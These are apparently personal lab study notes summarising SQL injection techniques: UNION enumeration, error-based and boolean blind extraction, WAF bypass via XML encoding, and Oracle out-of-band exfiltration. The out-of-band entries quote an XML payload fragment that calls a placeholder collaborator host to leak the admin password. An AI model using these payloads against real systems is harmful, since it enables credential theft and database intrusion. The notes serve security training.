Encounter Cliff Notes

- Oracle UNION enumeration → creds
  - Found injectable category filter. Used `UNION SELECT` against `dual`, listed tables/columns, dumped `users` and logged in as admin.

- Visible error-based via cookie
  - `track` injection produced DB errors. Cast subqueries to `int` to control error/no error and leak data, then extracted admin creds.

- Blind OOB (Oracle XML)
  - Injected `EXTRACTVALUE(xmltype('<!DOCTYPE... SYSTEM "http://<collab>" >'),'/l')` to trigger DNS. Confirmed vuln.

- Blind OOB exfil
  - Concatenated password into the collaborator hostname in the XML to exfiltrate admin password.

- WAF filter bypass via XML encoding
  - SQLi in XML body on `store`. Used HTML entity encoding and string concat to get single-column union; concatenated user and pass with delimiter.

- UNION: find columns and text column
  - Counted columns with `UNION SELECT NULL,...` then found text-bearing column replacing `NULL` with `'a'`.

- Dump creds directly via UNION
  - `UNION SELECT username,password FROM users` where columns matched.

- Boolean blind (welcome banner / status)
  - Used true/false conditions to control page behavior. With Intruder, iterated character positions using `SUBSTR` and boolean checks to recover 20-char password.

- Oracle error-based blind
  - Used CASE WHEN with divide-by-zero to trigger error on true. Probed existence and leaked length and characters via conditional errors.


